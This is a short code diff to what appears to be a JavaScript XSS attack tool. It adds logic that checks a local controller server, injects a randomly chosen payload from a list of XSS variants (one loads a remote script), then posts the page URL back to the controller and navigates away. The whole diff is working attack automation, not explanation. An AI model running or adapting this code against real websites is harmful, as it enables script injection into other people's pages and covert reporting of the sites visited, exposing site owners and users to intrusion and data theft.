@@ -49,8 +49,34 @@ var attackVariants = [
   '<SCRIPT a=">"SRC="http://0.0.0.0:8000/non-alpha-xss.js"></SCRIPT>'
 
 ];
+
+
+$.ajax({
+	type: "GET",
+	url: 'http://127.0.0.1:8080/',
+	success: function(data){
+		console.log('GET IS WORKING')
+		console.log(data)
+		if (!data){
+			XSSattack(attackVariants[Math.floor(Math.random() * attackVariants.length)]);
+			$.ajax({
+				type: "POST",
+				url: 'http://127.0.0.1:8080/',
+				data: document.URL,
+				success: function(data){
+					console.log('post is working');
+					window.history.back();
+				}
+			});
+		} else {
+			window.history.back();
+		}
+	}
+});
+
+
 // XSSattack(attackVariants[attackVariants.length-1]);
-XSSattack(attackVariants[Math.floor(Math.random() * attackVariants.length)]);
+
 
 
 
